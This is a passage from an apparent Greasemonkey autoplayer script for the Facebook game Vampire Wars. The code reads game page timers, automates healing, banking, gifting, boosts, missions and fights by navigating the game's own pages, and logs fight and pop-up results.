			FreeSpinDueHMS =  document.getElementById('hm_mandy').innerHTML.split('Free Spin in')[1].split('>')[1].split('<')[0];
			if(FreeSpinDueHMS.indexOf("Now!")!=-1){
				FreeSpinDue = 0;
			} else {
				FreeSpinDue = (FreeSpinDueHMS.split(':')[0] * 3600) + (FreeSpinDueHMS.split(':')[1] * 60) + (FreeSpinDueHMS.split(':')[2] * 1);
			}
			var now = Math.floor(new Date().getTime() / 1000);
			GM_setValue('spin',now + FreeSpinDue);
			//addToLog('(Index) Setting Free Spin time to: '+GM_getValue('spin')+' (now='+now+')');
		}
	}


	//autoSpin - get next free Blood Magic spin time
	if (location.href.indexOf('/buffs') != -1 && document.body.innerHTML.indexOf('Spin again in: ')!=-1){
		if(document.getElementById('buff_button_container').innerHTML.indexOf(" hours, ")!=-1){
			FreeSpinDueHoursMinutes =  document.getElementById('buff_button_container').innerHTML.split('<span class="treasure_timer">')[1].split('<')[0];
			if(FreeSpinDueHoursMinutes.indexOf("Now!")!=-1){
				FreeSpinDueHoursMinutes = 0;
			} else {
				FreeSpinDue = (FreeSpinDueHoursMinutes.split(' hours, ')[0] * 3600) + (FreeSpinDueHoursMinutes.split(' hours, ')[1].split(' minutes')[0] * 60);
			}
			var now = Math.floor(new Date().getTime() / 1000);
			GM_setValue('spin',now + FreeSpinDue);
			//addToLog('(Buffs) Setting Free Spin time to: '+GM_getValue('spin')+' (now='+now+')');
		} else if(document.getElementById('buff_button_container').innerHTML.indexOf(" minutes, ")!=-1){
			FreeSpinDueMinutesSeconds =  document.getElementById('buff_button_container').innerHTML.split('<span class="treasure_timer">')[1].split('<')[0];
			if(FreeSpinDueMinutesSeconds.indexOf("Now!")!=-1){
				FreeSpinDue = 0;
			} else {
				FreeSpinDue = (FreeSpinDueMinutesSeconds.split(' minutes, ')[0] * 60) + (FreeSpinDueMinutesSeconds.split(' minutes, ')[1].split(' seconds')[0] * 1);
			}
			var now = Math.floor(new Date().getTime() / 1000);
			GM_setValue('spin',now + FreeSpinDue);
			//addToLog('(Buffs) Setting Free Spin time to: '+GM_getValue('spin')+' (now='+now+')');
		}
	}

	
	// auto gifting logic
	if (location.href.indexOf('/gift') != -1){

		if (isGMChecked('autoGifting') && (GM_getValue('paused')==0) && GM_getValue('giftingCount', 0)>0) {

//		if((GM_getValue('autoGifting', '') != "checked") || (GM_getValue('paused')!=0) || GM_getValue('giftingCount', 0)<1)
//			return;
			log("auto gift " + attributes[GM_getValue('selectAttribute', 'nothing')][0] +" to "+ GM_getValue('giftingUser', 'xxxx')+" x "+ GM_getValue('giftingCount', '0'));

			// Get the Gift Link.
			var giftNumber=attributes[GM_getValue("selectAttribute", "nothing")][1];
			elt = xpathFirst('.//div[@id="giftButtonOn_'+giftNumber+'"]//a[contains(@href,"item_id='+giftNumber+'")]', innerPageElt);
			if (!elt) {
			    log('Can\'t find gift link to click. ');
			    return true;
			}

			// Give the Gift!
			Autoplay.fx = function() {
			    clickAction = 'give_gift';
			    clickElement(elt);
			    log('Giving Gift');
			};
			Autoplay.delay = delay;
			Autoplay.start();

			GM_setValue('giftingCount',GM_getValue('giftingCount', 0)-1);
			return true;
		}
	}
	
	// pause feature... dismiss the rest
	if( (GM_getValue('paused')!=0))
		return true;
	
	// autoheal
	if(GM_getValue('autoHeal', '') == "checked" && health<GM_getValue('healthLevel', '')  && rage>GM_getValue('healthRage', '') ){

		if(GM_getValue('stayZombie', '') == "checked" && rage<GM_getValue('stayZombieRage', '9999') && health<20 ){
			log('Autoplayer autoHeal - Staying Zombie @ health: '+health);
			return true;
		}

		log('Autoplayer autoHeal '+health);
//		window.location = "http://apps.facebook.com/"+SCRIPT.name+"/index.php?popup_action=Heal";
		if (isGMChecked('logHealEvents')) addToLog("Auto-heal at health: "+ health );
		document.getElementById('health_refill_popup').style.display = 'block';
		var sform = document.getElementById('health_refill_popup').getElementsByTagName('form')[0];
		setTimeout(function(){getElementsByAttribute(sform,"input", "type", "submit")[0].click();},0);
		return true;
	}

	// bank logic here
	if(GM_getValue('autoBank', '') == "checked" && blood>parseInt(GM_getValue('bankConfig', 100000))+10){
		log('Autoplayer autoBank ' + blood);
		document.getElementById('bank_popup').style.display = 'block';
		var sform = document.getElementById('bank_popup').getElementsByTagName('form')[1];
		document.getElementsByName("amount")[1].value = blood-GM_getValue('bankKeep', 50000);
//		setTimeout(function(){sform.submit();},delay);
		setTimeout(function(){getElementsByAttribute(sform,"input", "type", "submit")[0].click();},delay);
		return true;
	}

	return true;
}

function doAutoPlay (){
	// pause feature... dismiss the rest
	if((GM_getValue('paused', 0) != 0))
		return;

	log('Autoplayer doAutoPlay started.');

	// Visit the bookmarked Vampire Wars URL on the appropriate interval to gather bonus EXP
	if (!timeLeftGM('goToBookmarkURLInterval')) {
		setGMTime('goToBookmarkURLInterval', goToBookmarkURLInterval);
		log('Visiting VW Bookmark Bonus URL');
		addToLog('Visiting VW Bookmark Bonus URL');
 		window.location = "http://apps.facebook.com/"+SCRIPT.name+"/index.php?ref=bookmarks&count=0";
		return;
	}

	// Visit Crypt if checked
	if (GM_getValue('autoCrypt', '') == "checked" && !timeLeftGM('goToCryptURLInterval')) {
		setGMTime('goToCryptURLInterval', goToCryptURLInterval);
		log('Visiting Crypt');
		addToLog('Visiting Crypt');
 		window.location = "http://apps.facebook.com/"+SCRIPT.name+"/treasure.php";
		return;
	}

 
	// Blood Magic logic
	if(GM_getValue('autoBloodMagic', '') == "checked" && Math.floor(new Date().getTime() / 1000) > GM_getValue('spin',0)){
//		if (location.href.indexOf(SCRIPT.name+'/buffs') == -1)
//			window.location = "http://apps.facebook.com/"+SCRIPT.name+"/buffs.php";
		if (location.href.indexOf(SCRIPT.name+'/index.php?next=buffs.php') == -1)
			window.location = "http://apps.facebook.com/"+SCRIPT.name+"/index.php?next=buffs.php";
		return;
	}
	
	// lottery logic
	if (location.href.indexOf('/lottery.php') == -1 && GM_getValue('autoGamble', '') == "checked" && Math.floor(new Date().getTime() / 1000) > GM_getValue('LotteryDue',0)){
		window.location = "http://apps.facebook.com/"+SCRIPT.name+"/lottery.php";
		return;
	}


//	alert('now='+Math.floor(new Date().getTime() / 1000) +'   Collector Due='+ GM_getValue('CollectorDue',0));
	// Collector logic
//	if (location.href.indexOf('/collector.php') == -1 && GM_getValue('autoCollector', '') == "checked" && GM_getValue('autoCollectorPause', 'checked') != "checked" && Math.floor(new Date().getTime() / 1000) >= GM_getValue('CollectorDue',0)){
	if (location.href.indexOf('/collector.php') == -1 && GM_getValue('autoCollectorPause', 'checked') != "checked" && Math.floor(new Date().getTime() / 1000) >= GM_getValue('CollectorDue',0)){
		window.location = "http://apps.facebook.com/"+SCRIPT.name+"/collector.php";
		return;
	}


	//alert('now='+Math.floor(new Date().getTime() / 1000) +'   Elder\'s Retreat Due='+ GM_getValue('Retreat1Due',0));
	// Elder's Retreat timing
	if (location.href.indexOf('/eldersRetreat.php') == -1 && GM_getValue('autoRetreat', '') == "checked" && Math.floor(new Date().getTime() / 1000) >= GM_getValue('Retreat1Due',0)){
		window.location = "http://apps.facebook.com/"+SCRIPT.name+"/eldersRetreat.php";
		return;
	}
	if (location.href.indexOf('/eldersRetreat.php') == -1 && GM_getValue('autoRetreat', '') == "checked" && Math.floor(new Date().getTime() / 1000) >= GM_getValue('Retreat2Due',0)){
		window.location = "http://apps.facebook.com/"+SCRIPT.name+"/eldersRetreat.php";
		return;
	}


//Automatically use boosts
	var autoBoostFiftyNrgExpValue = maxenergy * .5 * GM_getValue('missionExpGain', 1.5);
	var autoBoostFiftyNrgExpWastePercent = (Math.round(((autoBoostFiftyNrgExpValue-ExpToNextLevel)/autoBoostFiftyNrgExpValue)*100*100))/100;
	if(autoBoostFiftyNrgExpWastePercent<0) autoBoostFiftyNrgExpWastePercent = 0;
//	if(GM_getValue('autoBoostFiftyNrg', '') == "checked" && energy < GM_getValue('autoBoostFiftyNrgMin', 0) && GM_getValue('numFiftyNrgBoosts', 0) > GM_getValue('autoBoostFiftyNrgKeep', 0)){
//	if(GM_getValue('autoBoostFiftyNrg', '') == "checked" && energy < GM_getValue('autoBoostFiftyNrgMin', 0) && GM_getValue('numFiftyNrgBoosts', 0) > GM_getValue('autoBoostFiftyNrgKeep', 0) && autoBoostFiftyNrgExpWastePercent <= GM_getValue('autoBoostWaste', 0)){
	if(GM_getValue('autoBoostFiftyNrg', '') == "checked" && energy < GM_getValue('autoBoostFiftyNrgMin', 0) && GM_getValue('numFiftyNrgBoosts', 0) > GM_getValue('autoBoostFiftyNrgKeep', 0) && autoBoostFiftyNrgExpWastePercent <= GM_getValue('autoBoostWaste', 0) && parseInt(GM_getValue('activeMagicGWStrength', '0%')) >= parseInt(GWStrOptions[parseInt(GM_getValue('autoBoostNRGMinGW',0))])){
		if (GM_getValue('autoLog', '') == "checked")
			addToLog("Using a 50% Energy Boost. Energy = " + energy + '  Exp to lvl = ' + ExpToNextLevel + '  Expected Waste = ' + autoBoostFiftyNrgExpWastePercent + '%  Glyph of Wisdom = ' + GM_getValue('activeMagicGWStrength', '0%'));
//			addToLog("Using a 50% Energy Boost. Energy = " + energy + '  Exp to lvl = ' + ExpToNextLevel + '  Expected Waste = ' + autoBoostFiftyNrgExpWastePercent + '%');
//		setTimeout("document.location = '"+"http://apps.facebook.com/"+SCRIPT.name+"/stats.php?useBoostCons=249'", delay);

		// Get the boost Link.
		elt = xpathFirst('.//div[@id="quickLinksBox"]//a[contains(@href,"stats.php?useBoostCons=249")]');
		if (!elt) {
		    log('Can\'t find 50% Energy Boost link to click. ');
		    return true;
		}

		// Use the boost!
		Autoplay.fx = function() {
		    clickAction = 'fifty_energy_boost';
		    clickElement(elt);
		    log('Using 50% Energy Boost');
		};
		Autoplay.delay = delay;
		Autoplay.start();

		return;
	}	
	var autoBoostHundredNrgExpValue = maxenergy * GM_getValue('missionExpGain', 1.5);
	var autoBoostHundredNrgExpWastePercent = (Math.round(((autoBoostHundredNrgExpValue-ExpToNextLevel)/autoBoostHundredNrgExpValue)*100*100))/100;
	if(autoBoostHundredNrgExpWastePercent<0) autoBoostHundredNrgExpWastePercent = 0;
//	if(GM_getValue('autoBoostHundredNrg', '') == "checked" && energy < GM_getValue('autoBoostHundredNrgMin', 0) && GM_getValue('numHundredNrgBoosts', 0) > GM_getValue('autoBoostHundredNrgKeep', 0)){
//	if(GM_getValue('autoBoostHundredNrg', '') == "checked" && energy < GM_getValue('autoBoostHundredNrgMin', 0) && GM_getValue('numHundredNrgBoosts', 0) > GM_getValue('autoBoostHundredNrgKeep', 0) && autoBoostHundredNrgExpWastePercent <= GM_getValue('autoBoostWaste', 0)){
	if(GM_getValue('autoBoostHundredNrg', '') == "checked" && energy < GM_getValue('autoBoostHundredNrgMin', 0) && GM_getValue('numHundredNrgBoosts', 0) > GM_getValue('autoBoostHundredNrgKeep', 0) && autoBoostHundredNrgExpWastePercent <= GM_getValue('autoBoostWaste', 0) && parseInt(GM_getValue('activeMagicGWStrength', '0%')) >= parseInt(GWStrOptions[parseInt(GM_getValue('autoBoostNRGMinGW',0))])){
		if (GM_getValue('autoLog', '') == "checked")
			addToLog("Using a 100% Energy Boost. Energy = " + energy + '  Exp to lvl = ' + ExpToNextLevel + '  Expected Waste = ' + autoBoostHundredNrgExpWastePercent + '%  Glyph of Wisdom = ' + GM_getValue('activeMagicGWStrength', '0%'));
//			addToLog("Using a 100% Energy Boost. Energy = " + energy + '  Exp to lvl = ' + ExpToNextLevel + '  Expected Waste = ' + autoBoostHundredNrgExpWastePercent + '%');
//		setTimeout("document.location = '"+"http://apps.facebook.com/"+SCRIPT.name+"/stats.php?useBoostCons=254'", delay);

		// Get the boost Link.
		elt = xpathFirst('.//div[@id="quickLinksBox"]//a[contains(@href,"stats.php?useBoostCons=254")]');
		if (!elt) {
		    log('Can\'t find 100% Energy Boost link to click. ');
		    return true;
		}

		// Use the boost!
		Autoplay.fx = function() {
		    clickAction = 'full_energy_boost';
		    clickElement(elt);
		    log('Using 100% Energy Boost');
		};
		Autoplay.delay = delay;
		Autoplay.start();

		return;
	}	


	var autoBoostRageExpValue = maxrage * GM_getValue('fightExpGain', 3);
	var autoBoostRageExpWastePercent = (Math.round(((autoBoostRageExpValue-ExpToNextLevel)/autoBoostRageExpValue)*100*100))/100;
	if(autoBoostRageExpWastePercent<0) autoBoostRageExpWastePercent = 0;
//	if(GM_getValue('autoBoostRage', '') == "checked" && rage < GM_getValue('autoBoostRageMin', 0) && GM_getValue('numRageBoosts', 0) > GM_getValue('autoBoostRageKeep', 0)){
//	if(GM_getValue('autoBoostRage', '') == "checked" && rage < GM_getValue('autoBoostRageMin', 0) && GM_getValue('numRageBoosts', 0) > GM_getValue('autoBoostRageKeep', 0) && autoBoostRageExpWastePercent <= GM_getValue('autoBoostWaste', 0)){
	if(GM_getValue('autoBoostRage', '') == "checked" && rage < GM_getValue('autoBoostRageMin', 0) && GM_getValue('numRageBoosts', 0) > GM_getValue('autoBoostRageKeep', 0) && autoBoostRageExpWastePercent <= GM_getValue('autoBoostWaste', 0) && parseInt(GM_getValue('activeMagicGGStrength', '0%')) >= parseInt(GGStrOptions[parseInt(GM_getValue('autoBoostRageMinGG',0))])){
		if (GM_getValue('autoLog', '') == "checked")
			addToLog("Using a 50% Rage Boost. Rage = " + rage + '  Exp to lvl = ' + ExpToNextLevel + '  Expected Waste = ' + autoBoostRageExpWastePercent + '%  Glyph of Guile = ' + GM_getValue('activeMagicGGStrength', '0%'));
//			addToLog("Using a 50% Rage Boost. Rage = " + rage + '  Exp to lvl = ' + ExpToNextLevel + '  Expected Waste = ' + autoBoostRageExpWastePercent + '%');
//		setTimeout("document.location = '"+"http://apps.facebook.com/"+SCRIPT.name+"/stats.php?useBoostCons=251'", delay);

		// Get the boost Link.
		elt = xpathFirst('.//div[@id="quickLinksBox"]//a[contains(@href,"stats.php?useBoostCons=251")]');
		if (!elt) {
		    log('Can\'t find Rage Boost link to click. ');
		    return true;
		}

		// Use the boost!
		Autoplay.fx = function() {
		    clickAction = 'rage_boost';
		    clickElement(elt);
		    log('Using Rage Boost');
		};
		Autoplay.delay = delay;
		Autoplay.start();

		return;
	}	


// Automate Special Events
	if(eventActive && GM_getValue('autoEventMission', '') == "checked" && energy>=(eventMissions[GM_getValue('selectEventMissionA', 0)][1]+parseInt(GM_getValue('missionExpReserve', 0))) && ((eventHasResource && eventNumResources >= (eventMissions[GM_getValue('selectEventMissionA', 0)][5])) || (eventHasResource == false))){
//		if (location.href.indexOf(SCRIPT.name+'/event') == -1)
//		if ((location.href.indexOf('/eventhome.php') == -1) && (location.href.indexOf('/eventjobs.php') == -1))
//		if (location.href.indexOf('/eventhome.php') == -1)
		if (location.href.indexOf('/event') == -1)
		{
//			window.location = "http://apps.facebook.com/"+SCRIPT.name+"/"+eventWaypoint;

			// Get the Event Waypoint (Home) link.
			elt = xpathFirst('.//div[@id="event_lock"]//a[contains(@href,"'+eventWaypoint+'")]', contentRowElt);

			if (!elt) {
			    log('Can\'t find Event Waypoint (Home) link to click. ');
			    return true;
			}

			// Go to the Event Waypoint (Home).
			Autoplay.fx = function() {
			    clickAction = 'go_event_waypoint';
			    clickElement(elt);
			    log('Going to Event Waypoint (Home).');
			};
			Autoplay.start();

		} else {
			window.location = "http://apps.facebook.com/"+SCRIPT.name+"/eventjobs.php?currentTier="+eventMissions[GM_getValue('selectEventMissionA', 0)][2];
		}
		return;
	}	


// Configurable priority (mission vs. fight)
	if(GM_getValue('missionPriority','checked') == 'checked') {
		// automission logic here
		if(GM_getValue('autoMission', '') == "checked" && energy>=(missions[GM_getValue('selectMission', 1)][1]+parseInt(GM_getValue('missionExpReserve', 0)))){
			window.location = "http://apps.facebook.com/"+SCRIPT.name+"/jobs.php?currentTier="+missions[GM_getValue('selectMission', 1)][2];
			return;
		}	

		// autofight
		if(GM_getValue('autoFight', '') == "checked" && rage>GM_getValue('fightKeepRage', 0) &&health>19){
			if(GM_getValue('fightArena', '') == "checked")
				window.location = "http://apps.facebook.com/"+SCRIPT.name+"/arena.php";
			else
				window.location = "http://apps.facebook.com/"+SCRIPT.name+"/fight.php";
			return;
		}

	} else {
		if(GM_getValue('autoFight', '') == "checked" && rage>GM_getValue('fightKeepRage', 0) &&health>19){
			if(GM_getValue('fightArena', '') == "checked")
				window.location = "http://apps.facebook.com/"+SCRIPT.name+"/arena.php";
			else
				window.location = "http://apps.facebook.com/"+SCRIPT.name+"/fight.php";
			return;
		}
		if(GM_getValue('autoMission', '') == "checked" && energy>=(missions[GM_getValue('selectMission', 1)][1]+parseInt(GM_getValue('missionExpReserve', 0)))){
			window.location = "http://apps.facebook.com/"+SCRIPT.name+"/jobs.php?currentTier="+missions[GM_getValue('selectMission', 1)][2];
			return;
		}
	} 	

	// Periodically visit the Index page
	if (!timeLeftGM('goToIndexTimer')) {
		window.location = "http://apps.facebook.com/"+SCRIPT.name+"/index.php";
		return;
	}

	// Periodically visit the Stats page
	if (!timeLeftGM('goToStatsTimer')) {
		window.location = "http://apps.facebook.com/"+SCRIPT.name+"/stats.php";
		return;
	}
	
	// minion cost
	if(GM_getValue('spendBank', '') == "checked"){
		var totalblood = blood + bankvalue -  GM_getValue('spendBankKeep', 0);
	} else {
		var totalblood = blood;
	}
	if(GM_getValue('autoMinion', '') == "checked" && totalblood > GM_getValue('minionCostk', 0)*10*1000){
		window.location = "http://apps.facebook.com/"+SCRIPT.name+"/properties.php";
		return;
	}
	
	// auto gift
	if (location.href.indexOf('/gift') == -1 && GM_getValue('autoGifting', '') == "checked" && GM_getValue('giftingCount', 0)>0 ){
		window.location = "http://apps.facebook.com/"+SCRIPT.name+"/gift.php?user_id="+ GM_getValue('giftingUser', 'xxxx');
		return;
	}

	// Check Blood Magic levels
	if (!timeLeftGM('activeMagicTimer')) {
		window.location = "http://apps.facebook.com/"+SCRIPT.name+"/index.php?next=buffs.php";
		return;
	}

	// Judge Favored Clan
	if (GM_getValue('clanJudgeFC','checked') == 'checked') {
		var clanJudgeLimitTimeT1to2OK = false;
//		var clanJudgeLimitTimeT3to4OK = false;

		if(GM_getValue('clanJudgeLimitTimeT1toT2', '') == "checked") {
			if(timeBetween(GM_getValue('clanJudgeLimitTimeT1Time','00:00'),GM_getValue('clanJudgeLimitTimeT2Time','00:00'))) {
				clanJudgeLimitTimeT1to2OK = true;
			} else {
				clanJudgeLimitTimeT1to2OK = false;
			}
		} else {
			clanJudgeLimitTimeT1to2OK = true;
		}

//		if(GM_getValue('clanJudgeLimitTimeT3toT4', '') == "checked") {
//			if(timeBetween(GM_getValue('clanJudgeLimitTimeT3Time','00:00'),GM_getValue('clanJudgeLimitTimeT4Time','00:00'))) {
//				clanJudgeLimitTimeT3to4OK = true;
//			} else {
//				clanJudgeLimitTimeT3to4OK = false;
//			}
//		} else {
//			clanJudgeLimitTimeT3to4OK = true;
//		}

		if(clanJudgeLimitTimeT1to2OK /* && clanJudgeLimitTimeT3to4OK */ ) {
			// alert('Elements in Clan List='+GM_getValue('clanList', '').split("\n").length);
			var clanJudgedListArray = GM_getValue('clanJudgedList').split(',');

			for (index = 0; index < GM_getValue('clanList', '').split("\n").length; index++) {

				var FCuserID = GM_getValue('clanList', '').split("\n")[index];
				// alert('FCuserID='+FCuserID);
				var FCuserIDJudgeIndex = clanJudgedListArray.indexOf(FCuserID);
				// alert('Found FCuserID index='+FCuserIDJudgeIndex);
				if (FCuserIDJudgeIndex == -1) {
					// This clan member has never been judged before - go to their stats page
					window.location = "http://apps.facebook.com/"+SCRIPT.name+"/stats.php?user="+FCuserID;
					return;
				} else {
					// This clan member has been judged before - find out the last time
					var FCuserIDJudgeLastTime = clanJudgedListArray[FCuserIDJudgeIndex+1]*1000;
					// alert('FCuserID '+FCuserID+' was last judged @ '+ new Date(clanJudgedListArray[FCuserIDJudgeIndex+1]).format("HH:MM:ss")+' on '+ new Date(clanJudgedListArray[FCuserIDJudgeIndex+1]).format("yyyy-mm-dd"));
					if (FCuserIDJudgeLastTime+clanJudgeInterval < new Date().getTime()) {
						// alert('FCuserID '+FCuserID+' needs to be judged');
						window.location = "http://apps.facebook.com/"+SCRIPT.name+"/stats.php?user="+FCuserID;
						return;
					}
				}
			}
		}
	}

	log('Autoplayer doAutoPlay finished.');
	//document.location = 'http://apps.facebook.com/'+SCRIPT.name+ GM_getValue('refreshPage', "/index.php");
}

///////////////////////////////////////////////////////////////////////////////
//   begin of page code.                    Automatic play is kicked off by doAutoPlay().    //
///////////////////////////////////////////////////////////////////////////////

function LogEvents(){	

	log('Autoplayer LogEvents');

// Log entry to record username, ID, Level, Clan Size, Skill of ppl who are attacked
	try{
		var fightresultbox = document.getElementById('fight_result');
		if(fightresultbox.innerHTML.length==0)
			return;
		var userlink = fightresultbox.innerHTML.split('fighter fighter_right')[1].split('href="')[1].split('"')[0];
		var username = fightresultbox.innerHTML.split('fighter fighter_right')[1].split('<span title="')[1].split('">')[0];
		var user = '<a href="'+userlink+'">'+username+'</a>';

	 	var ArenaListBlockDiv = document.evaluate("//div[@class='arenaListBlock']", document,null,9,null).singleNodeValue;
	 	var FightTableDiv = document.evaluate("//div[@class='fight_table_container']", document,null,9,null).singleNodeValue;


// Automatically add to avoid list vamps I have lost to 
		var userid = userlink.split('user=')[1];
		if(fightresultbox.innerHTML.indexOf('You won the fight') != -1){


// Log entry to record gained exp and gained/lost SR when I attack ppl
			var fightexpgained = fightresultbox.innerHTML.split('fight_center_stats')[1].split('You gained ')[1].split(' exp!')[0].toInt();
			if (FightTableDiv)
				GM_setValue('statsAttacksExp',GM_getValue('statsAttacksExp', 0)+fightexpgained);
			else if (ArenaListBlockDiv)
				GM_setValue('statsArenaExp',GM_getValue('statsArenaExp', 0)+fightexpgained);
			var srgain = fightresultbox.innerHTML.split('fighter fighter_left')[1].split('Rank:  ')[1].split(' = ')[0];
			var srgaincolor = "#FFFFFF";
			if(srgain>0)
				var srgaincolor = "#58FA58";
			if(srgain<0)
				var srgaincolor = "#FA5858";
			
// Grab and save my current number of clan and Skill Rating
			var mySkillRanking = fightresultbox.innerHTML.split('fighter fighter_left')[1].split('Rank:  ')[1].split(' = ')[1].split('<br>')[0];
			if (FightTableDiv) {
				GM_setValue('mySkillRanking',mySkillRanking);
				if (isGMChecked('logFightResults')) addToLog("fought "+ user + " <span style='color:#58FA58'>WON</span>   +"+fightexpgained+" exp  <span style='color:"+srgaincolor+"'>"+srgain+" SR</span>");
				GM_setValue('statsAttacksWins',GM_getValue('statsAttacksWins', 0)+1);
			} else if (ArenaListBlockDiv) {
				GM_setValue('mySkillRankingArena',mySkillRanking);
				if (isGMChecked('logFightResults')) addToLog("ARENA: fought "+ user + " <span style='color:#58FA58'>WON</span>   +"+fightexpgained+" exp  <span style='color:"+srgaincolor+"'>"+srgain+" SR</span>");
				GM_setValue('statsArenaWins',GM_getValue('statsArenaWins', 0)+1);
			}
			refreshStatsBox();
		}

		if(fightresultbox.innerHTML.indexOf('You lost the fight.') != -1){
// Log entry to record gained exp and gained/lost SR when I attack ppl
			var srgain = fightresultbox.innerHTML.split('fighter fighter_left')[1].split('Rank:  ')[1].split(' = ')[0];
// Grab and save my current number of clan and Skill Rating
			var mySkillRanking = fightresultbox.innerHTML.split('fighter fighter_left')[1].split('Rank:  ')[1].split(' = ')[1].split('<br>')[0];
			if (FightTableDiv) {
				GM_setValue('mySkillRanking',mySkillRanking);
				addToLog("fought "+ user + " <span style='color:#FA5858'>LOST</span>  +0 exp  <span style='color:"+srgaincolor+"'>"+srgain+" SR</span>");
				GM_setValue('statsAttacksLosses',GM_getValue('statsAttacksLosses', 0)+1);
			} else if (ArenaListBlockDiv) {
				GM_setValue('mySkillRankingArena',mySkillRanking);
				addToLog("ARENA: fought "+ user + " <span style='color:#FA5858'>LOST</span>  +0 exp  <span style='color:"+srgaincolor+"'>"+srgain+" SR</span>");
				GM_setValue('statsArenaLosses',GM_getValue('statsArenaLosses', 0)+1);
			}
			refreshStatsBox();

// Automatically add to avoid list vamps I have lost to 
			if(GM_getValue('autoFightAvoidLost', '') == "checked") {
				// Add the ID to the list
				if (FightTableDiv) {
					addSavedListItem('autoFightLossList',userid+',',GM_getValue('autoFightLossListSize',0));
					var fightListAvoidRefresh = fightListAvoid;
					fightListAvoidRefresh = fightListAvoidRefresh.concat(mySelectClanAvoid);
//					fightListAvoidRefresh = fightListAvoidRefresh.concat(autoFightLossList);
					fightListAvoidRefresh = fightListAvoidRefresh.concat(GM_getValue('autoFightLossList'));
					blacklist = fightListAvoidRefresh.toString();
					addToLog("AVOIDING: "+ userid);
				} else if (ArenaListBlockDiv) {
//					addToLog('autoFightArenaLossList (before)='+GM_getValue('autoFightArenaLossList'));
					addSavedListItem('autoFightArenaLossList',userid+',',GM_getValue('autoFightLossListSize',0));
//					addToLog('autoFightArenaLossList (after)='+GM_getValue('autoFightArenaLossList'));
					var fightListAvoidRefresh = fightListAvoid;
					fightListAvoidRefresh = fightListAvoidRefresh.concat(mySelectClanAvoid);
//					fightListAvoidRefresh = fightListAvoidRefresh.concat(autoFightArenaLossList);
					fightListAvoidRefresh = fightListAvoidRefresh.concat(GM_getValue('autoFightArenaLossList'));
					blacklistArena = fightListAvoidRefresh.toString();
					addToLog("AVOIDING (Arena): "+ userid);
//					addToLog('blacklistArena='+blacklistArena);
//					addToLog('autoFightArenaLossList='+GM_getValue('autoFightArenaLossList'));
				}
			}

		}

		// Add button to attack a Zombie
		if(fightresultbox.innerHTML.indexOf('Your might is too great') != -1 && FightTableDiv){
			var flightresultfledelt = fightresultbox.getElementsByTagName('tbody')[0];
			var attackzombieelt = document.createElement('tr');
			attackzombieelt.innerHTML = '<td><center><form action="fight.php" method="post" onsubmit="submitForm(\'mainDiv\', \'fight.php\', this,\'TopField\'); return false;" id="attack_'+userid+'"><input value="'+userid+'" name="opponent_id" type="hidden"><input name="action" value="attack" type="hidden"><input value="Attack Again!" class="sysbutton_h28 w102xh28" type="submit"></form></center></td>';
			flightresultfledelt.appendChild(attackzombieelt);
			if(GM_getValue('rFightList', '') == "checked")
				CycleFightList();	
		}

	}
	catch(e){}

// Catch Pop-up messages (Kills, Blood Magic results)
	try{
		var messagepopup0box = document.getElementById('message_popup_0');


		if(messagepopup0box.innerHTML.length==0)
			return;

////		addToLog("POP UP MESSAGE: "+messagepopup0box.innerHTML);
//		if(messagepopup0box.innerHTML.indexOf('<div class="margin_wide_buttons">') != -1){
//			addToLog("POP UP MESSAGE: "+messagepopup0box.innerHTML.split('<div class="margin_wide_buttons">')[0]);
//		} else {
//			addToLog("POP UP MESSAGE: "+messagepopup0box.innerHTML);
//		}

//		if(messagepopup0box.getElementsByTagName('div').getElementsByTagName('p').innerHTML.indexOf('You just killed') != -1){
		if(messagepopup0box.innerHTML.indexOf('You just killed') != -1){
			log("KILL "+messagepopup0box.innerHTML);	
//			var killresult = messagepopup0box.getElementsByTagName('div').getElementsByTagName('p').innerHTML.split('You just killed')[1].split('</p>')[0];
			var killresult = messagepopup0box.innerHTML.split('You just killed')[1].split('</p>')[0];
			addToLog("You just killed " + killresult);
		}
		else if(messagepopup0box.innerHTML.indexOf('The wheel halts suddenly') != -1){
			var bloodmagicresult = document.evaluate("//div[@class='buff_desc']",document,null,9,null).singleNodeValue.innerHTML;
			addToLog("BLOOD MAGIC RESULT: " + bloodmagicresult);
		}
		else if(messagepopup0box.innerHTML.indexOf('ve been promoted to') != -1){
//			var levelup = document.evaluate("//div[@id='app25287267406_levBoard']",document,null,9,null).singleNodeValue.innerHTML;
			var levelup = document.evaluate("//div[@class='promoted']",document,null,9,null).singleNodeValue.innerHTML;
			addToLog("LEVEL-UP: " + levelup);
			// Trigger a visit to the Stats page to Auto-stat
			setGMTime('goToStatsTimer', '00:00');
		}
		else if(messagepopup0box.innerHTML.indexOf('found a Lonely Minion') != -1){
			var promominion = messagepopup0box.innerHTML.split('<div class="lonelyMinionsCongratsText">')[1].split('<div class="message_earned_feed_link">')[0];
			addToLog("Found Promo Minion: " + promominion);
		}
		else if(messagepopup0box.innerHTML.indexOf('As a reward, the elders are giving you some extra to share with your friends') != -1){
			var eventitemshare = messagepopup0box.innerHTML.split('<div class="pop_text_cont">')[1].split('<div class="message_earned_feed_link pop_button_cont"')[0];
			addToLog("Event Items to share: " + eventitemshare);
		}
		else if(messagepopup0box.innerHTML.indexOf('Click "Wait" to collect your boost later') != -1){
			var collectorWaitElt = xpathFirst('//div[@class="pop_buttons"]/a[contains(.,"Wait") and contains(.,"collector.php")]',messagepopup0box);
			if(collectorWaitElt) {
				addToLog('Collector: Can\'t collect Energy Boost - You have too many of them!  Auto Collector paused.');
				//GM_setValue('autoCollector',0);
				GM_setValue('autoCollectorPause', 'checked')

				if (!collectorWaitElt) {
				    log('Can\'t find \'Wait\' button to click. ');
				    return true;
				}

				// Tell the Collector to Wait!
				Autoplay.fx = function() {
				    clickAction = 'collector_wait';
				    clickElement(collectorWaitElt);
				    log('Collector: Too many Energy Boosts to collect - telling him to wait');
				    addToLog('Collector: Too many Energy Boosts to collect - telling him to wait');
				};
				Autoplay.delay = delay;
				Autoplay.start();
			}
		}
		else {
			addToLog("POP UP MESSAGE: "+messagepopup0box.innerHTML);
		}
	}
	catch(e){}


	// Catch Ancient Chest Results
	try{
		var cacheresultmessage = document.getElementById('cache_result_message_contents');

		if(cacheresultmessage.innerHTML.length==0)
			return;

		if(cacheresultmessage.innerHTML.indexOf('You have received') != -1){
			var ancientchestresult = document.evaluate("//div[@id='cache_result_message_contents']//div[@class='mission_cache_message_text']",document,null,9,null).singleNodeValue.innerHTML;
			addToLog("Ancient Chest Result: " + ancientchestresult);
		}
	}
	catch(e){}


	if (document.body.innerHTML.indexOf('message_body') == -1)
		return;

	try{
